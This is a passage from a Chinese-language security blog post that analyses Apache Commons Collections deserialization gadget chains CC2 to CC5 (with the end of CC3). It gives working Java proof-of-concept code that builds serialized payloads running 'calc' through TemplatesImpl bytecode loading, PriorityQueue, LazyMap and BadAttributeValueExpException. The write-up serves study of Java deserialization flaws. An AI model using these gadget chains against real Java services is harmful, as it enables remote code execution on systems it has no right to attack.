<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;public Evil() throws Exception&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(code,ctClass);    <span class="comment">//创建构造函数</span></span><br><span class="line">ctClass.addConstructor(constructor);</span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));  <span class="comment">//设置父类</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;</span><br><span class="line">         )</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"><span class="comment">// 创建一个动态代理对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor1.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代理对象封装到AnnotationInvocationHandler中</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor2.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:/cc3.poc&quot;</span>));</span><br><span class="line">objectOutputStream.writeObject(invocationHandler1);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:/cc3.poc&quot;</span>));</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%201.png" alt="Untitled"></p>
<h2 id="三、CommonsCollection2链"><a href="#三、CommonsCollection2链" class="headerlink" title="三、CommonsCollection2链"></a>三、CommonsCollection2链</h2><p>  在CC2链中，导入的是commons-collections4:4.0这个包。它最终利用到的也是TemplatesImpl来加载恶意字节码。因此我们只需要关注前面构造的部分，最终是如何调用到TemplatesImpl.newTransformer方法或者TemplatesImpl.getOutputProperties方法的。</p>
<p>  在TransformingComparator.compare方法中，调用了this.transformer.transform方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">	<span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">  <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  因此在向上追溯的时候，我们只需要关注哪个地方调用了compare方法。在CC2链中，反序列化的入口点选的是PriorityQueue这个类，从该类的readObject方法触发，通过调用heapify()→siftDownUsingComparator()→comparator.compare()，最终调用到TransformingComparator.compare方法，因此我们构造的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] objects = (Object[]) queue.get(priorityQueue);</span><br><span class="line">objects[<span class="number">0</span>] = object;</span><br><span class="line">objects[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">iMethod</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">iMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iMethod.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  这里调用add去添加元素，是为了构造size；另外在构造POC的时候，需要通过反射方式去改变InvokerTransformer中的iMethodName属性值，这是由于在调用add的时候，最终会执行到InvokerTransformer.transform方法，调用添加的那个元素的某个方法；（查看堆栈信息调用链可以了解到这部分内容）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%202.png" alt="Untitled"></p>
<h2 id="四、CommonsCollection4链"><a href="#四、CommonsCollection4链" class="headerlink" title="四、CommonsCollection4链"></a>四、CommonsCollection4链</h2><p>  CC4链是CC2链的变种，和CC3一样，它用InstantiateTransformer类来替换InvokerTransformer，然后配合前面说到的com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类，在调用了其构造方法之后，执行TemplatesImlp.newTransformer方法，从而加载恶意字节码信息。</p>
<p>  CC4链前半部分内容基本和CC2相似，反序列化的入口点都是PriorityQueue.readObject；只不过在CC2链中，是直接调用了InvokerTransformer.transform方法来执行TemplatesImlp.newTransformer，而在本条链中，我们需要借助ChainedTransformer方法；（这部分的构造和CC3链相似），因此可以构造如下代码：（理想情况下）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImp&#125;</span><br><span class="line">               )</span><br><span class="line">       &#125;</span><br><span class="line">);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  但是这样构造，在下面调用add函数的时候会出错；因此我们还是和上面一样，先构造一个正常的，然后在调用add函数之后，利用反射的方式去修改具体的值，最后的构造代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(constantTransformer,instantiateTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">iconstant</span> <span class="operator">=</span> constantTransformer.getClass().getDeclaredField(<span class="string">&quot;iConstant&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">iParam</span> <span class="operator">=</span> instantiateTransformer.getClass().getDeclaredField(<span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">iArgs</span> <span class="operator">=</span> instantiateTransformer.getClass().getDeclaredField(<span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line">iconstant.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iParam.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iArgs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">iconstant.set(constantTransformer, TrAXFilter.class);</span><br><span class="line">Object[] iparam = (Object[]) iParam.get(instantiateTransformer);</span><br><span class="line">Object[] iargs = (Object[]) iArgs.get(instantiateTransformer);</span><br><span class="line">iparam[<span class="number">0</span>] = Templates.class;</span><br><span class="line">iargs[<span class="number">0</span>] = templatesImp;</span><br></pre></td></tr></table></figure>

<h2 id="五、CommonsCollection5链"><a href="#五、CommonsCollection5链" class="headerlink" title="五、CommonsCollection5链"></a>五、CommonsCollection5链</h2><p>  CC5的利用有一定的限制，它要求JDK版本是8u76并且没有Security Manager；CC5的构造比较简单，核心利用的还是LazyMap，和CC1相同，只不过将反序列化的入口点更改了。</p>
<p>  在CC1中，调用LazyMap.get方法，是在AnnotationInvocationHandler.invoke中进行调用的，这里用到了动态代理的技术。而在CC5这条链中，借助了两个类，一个是TiedMapEntry，另一个是BadAttributeValueExpException；该链的入口点是BadAttributeValueExpException.readObject方法，在这其中，控制变量值，让其调用到TiedMapEntry.toString方法，进行进入到其getValue方法，调用了map的get方法，完成了整条链的拼接。CC5前半部分的调用链如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">   TiedMapEntry.toString()</span><br><span class="line">      TiedMapEntry.getValue()</span><br><span class="line">         LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>  前面说到该条链的利用需要没有Security Manager，其实在BadAttributeValueExpException.readObject方法中就可以很直观的看到。由于该链前面部分比较简单，因此我们可以直接利用CC1链中构造好的LazyMap对象来构造此链，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                constantTransformer,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:/cc5.poc&quot;</span>));</span><br><span class="line">objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:/cc5.poc&quot;</span>));</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%203.png" alt="Untitled"></p>
<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​    CC1链中用到的AnnotationInvocationHandler入口需要JDK版本7；总的来说，这几条链都会用到几个核心的构造链，比如TemplateImpl，或者transform；在后续分析CC6和CC7的时候，其实调用链很简单，只不过在构造payload的时候，需要注意一些细节的东西，因此在后续分析中这两条链的时候，会详细看看细节部分。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" data-id="cl8h29x4t000cdgdpekva4oqq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Java安全---JNDI注入解析
        
      </div>
    </a>
  
  
    <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">RWCTF 4th Desperate Cat 赛题学习与复现</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/">域渗透---黄金白银票据伪造</a>
          </li>
        
          <li>
            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
          </li>
        
          <li>
            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
          </li>
        
          <li>
            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
          </li>
        
          <li>
            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>